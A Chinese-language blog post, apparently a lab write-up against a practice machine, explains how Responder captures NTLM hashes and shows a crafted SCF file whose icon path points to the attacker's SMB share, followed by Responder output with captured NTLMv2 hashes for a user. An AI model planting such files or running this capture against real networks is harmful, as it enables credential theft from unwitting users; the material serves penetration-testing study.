---
title: 嗅探
date: 2026-03-01T17:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - 技术
  - Responder
---
## Responder

Responder 可以对接收到的 `NTLM` 认证尝试进行中间人共计（MITM），通过向请求者发送伪造的 `NTLM` 挑战来获取 `NTLM` 响应，这个响应包含了加密后的用户凭据的散列值。Responder 不直接解密这些散列值，而是采集这些数据，以便于离线攻击解码这些散列。

SCF 文件是一种 Windows Shell 文件，用于执行特定的的系统命令。可以用于自动化某些与 Windows 资源管理器交互的任务，例如打开特定的系统工具或控制资源管理器的行为。

创建一个 SCF 文件，访问一个不存在的 smb 地址，这样会导致解析协议降级到 nbt-ns 或 llmnr，可能触发 ntlm 认证，如何做中间人攻击。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat enil.scf 
[Shell]
Command=2
IconFile=\\10.10.16.155\enil
[Taskbar]
Command=Test
```

使用 responder 监听。

```bash
┌──(kali㉿kali)-[~/Work/Kali]                                                                                                                                                                     
└─$ sudo responder -I tun0 -v                                                                                                                                                                                                              __                                                                                                                                                         .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                                                                                            |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                                                                                          
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                           
                   |__|                                                                                                                                                                           
                                                                                                                                                                                                             NBT-NS, LLMNR & MDNS Responder 3.1.5.0                                                                                                                                                                                                                                                                                                                                                     To support this project:                                                                                                                                                                        
  Github -> https://github.com/sponsors/lgandx  
  Paypal  -> https://paypal.me/PythonResponder                                                                                                                                                    
                                                                                                                                                                                                  
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)                                                                                                                                               
  To kill this script hit CTRL-C                                                                                                                                                                  


[+] Poisoners:                                  
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:                                    
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]
        WinRM server               [ON]                                                                                                                                              09:03:10 [65/185]    SNMP server                [OFF]                                                                                                                                                                                                                                                                                                                                                                [+] HTTP Options:                                                                                                                                                                                 
    Always serving EXE         [OFF]            
    Serving EXE                [OFF]                                                                                                                                                              
    Serving HTML               [OFF]                                                                                                                                                                  Upstream Proxy             [OFF]                                                                                                                                                                                                                                                                                                                                                                [+] Poisoning Options:                                                                                                                                                                            
    Analyze Mode               [OFF]                                                             
    Force WPAD auth            [OFF]                                                                                                                                                              
    Force Basic Auth           [OFF]                                                                                                                                                                  Force LM downgrade         [OFF]                                                                                                                                                                  Force ESS downgrade        [OFF]                                                                                                                                                                                                                                                                                                                                                                
[+] Generic Options:                            
    Responder NIC              [tun0]                                                                                                                                                             
    Responder IP               [10.10.16.155]                                                                                                                                                     
    Responder IPv6             [dead:beef:4::1099]                                                                                                                                                
    Challenge set              [random]                                                                                                                                                           
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']                                        
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]        
                                                
[+] Current Session Variables:     
    Responder Machine Name     [WIN-V5VWOPA0X2M]
    Responder Domain Name      [14SQ.LOCAL]
    Responder DCE-RPC Port     [47012]

[+] Listening for events...                     
                                                
[SMB] NTLMv2-SSP Client   : 10.129.5.91
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:0f3d3a4556180c16:758A05F61A29B2766216AF2F45589E87:010100000000000080C02DF790A8DC01281DCEA0B2A88BC70000000002000800310034005300510001001E00570049004E002D0
056003500560057004F00500041003000580032004D0004003400570049004E002D0056003500560057004F00500041003000580032004D002E0031003400530051002E004C004F00430041004C000300140031003400530051002E004C004F004
30041004C000500140031003400530051002E004C004F00430041004C000700080080C02DF790A8DC0106000400020000000800300030000000000000000000000000200000AB616315500E1852C7379E562BF5F4BC1F8EF92EBBB6C4BB59DF47D
652564A5B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310035003500000000000000000000000000
[SMB] NTLMv2-SSP Client   : 10.129.5.91
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:ca21e3e89051ede8:D478E52273860FCB0164A9E6AD33785E:010100000000000080C02DF790A8DC0115D2FD48156979C80000000002000800310034005300510001001E00570049004E002D0
056003500560057004F00500041003000580032004D0004003400570049004E002D0056003500560057004F00500041003000580032004D002E0031003400530051002E004C004F00430041004C000300140031003400530051002E004C004F004
30041004C000500140031003400530051002E004C004F00430041004C000700080080C02DF790A8DC0106000400020000000800300030000000000000000000000000200000AB616315500E1852C7379E562BF5F4BC1F8EF92EBBB6C4BB59DF47D
652564A5B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310035003500000000000000000000000000
```
